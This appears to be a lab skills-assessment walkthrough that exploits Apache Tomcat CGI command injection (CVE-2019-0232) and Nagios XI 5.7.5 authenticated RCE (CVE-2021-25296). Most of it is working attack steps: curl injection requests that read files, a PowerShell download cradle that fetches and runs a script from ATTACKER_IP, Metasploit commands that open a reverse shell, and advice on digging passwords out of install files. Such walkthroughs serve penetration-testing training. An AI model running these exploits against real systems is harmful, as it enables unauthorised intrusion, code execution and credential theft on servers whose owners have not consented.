# Skills Assessments

---

## Skills Assessment I: Tomcat CGI — CVE-2019-0232

### Objective
Exploit Tomcat CGI command injection on Windows to achieve RCE.

### Walkthrough

- [ ] Enumerate target: `nmap -sV -p 8080 TARGET`
- [ ] Fuzz for CGI scripts:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/CGIs.txt \
  -u "http://TARGET:8080/cgi/FUZZ.bat" -fs <default_size>
```
- [ ] Also try `.cmd` extension:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/CGIs.txt \
  -u "http://TARGET:8080/cgi/FUZZ.cmd" -fs <default_size>
```
- [ ] Found script (e.g., `cmd.bat`) → test command injection:
```bash
# List environment variables
curl "http://TARGET:8080/cgi/cmd.bat?&set"

# Directory listing
curl "http://TARGET:8080/cgi/cmd.bat?&dir"

# Whoami (full path needed — PATH not set)
curl "http://TARGET:8080/cgi/cmd.bat?&c:\windows\system32\whoami.exe"
```
- [ ] Read flag:
```bash
curl "http://TARGET:8080/cgi/cmd.bat?&type+c:\users\administrator\desktop\flag.txt"
```
- [ ] For full RCE — use public PoC script or PowerShell download cradle:
```bash
curl "http://TARGET:8080/cgi/cmd.bat?&c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe+-ep+bypass+-c+IEX(New-Object+Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')"
```

### Key Notes
- `enableCmdLineArguments` must be `true` (non-default) for this to work
- Use `&` as command separator (not `;` — this is Windows)
- URL-encode special characters
- PATH is not set in CGI context → use full paths to executables

---

## Skills Assessment II: Nagios XI 5.7.5 — Authenticated RCE

### Objective
Exploit Nagios XI 5.7.5 to achieve RCE.

### Walkthrough

- [ ] Enumerate target: `nmap -sV -p 80,443 TARGET`
- [ ] Identify Nagios XI on login page
- [ ] Find credentials — check unusual places:
```bash
# Hint: look at PostgreSQL INSTALL file
# Download/read INSTALL file and diff against default
diff INSTALL /path/to/default/INSTALL
# Password may be embedded in install instructions or configs
```
- [ ] Login to Nagios XI with discovered password
- [ ] Exploit via Metasploit:
```bash
msfconsole -q
use exploit/linux/http/nagios_xi_configwizards_authenticated_rce
set RHOSTS TARGET
set PASSWORD <discovered_password>
set LHOST ATTACKER_IP
run
```
- [ ] This exploits CVE-2021-25296 — authenticated RCE via configuration wizards
- [ ] Get shell → `whoami` → read flag

### Key Notes
- Nagios default creds: `nagiosadmin:PASSWD` (set during install)
- CVE-2021-25296 affects Nagios XI 5.7.5
- Password may not be the default — enumerate and check config files
- PostgreSQL INSTALL file is a common place to find modified passwords
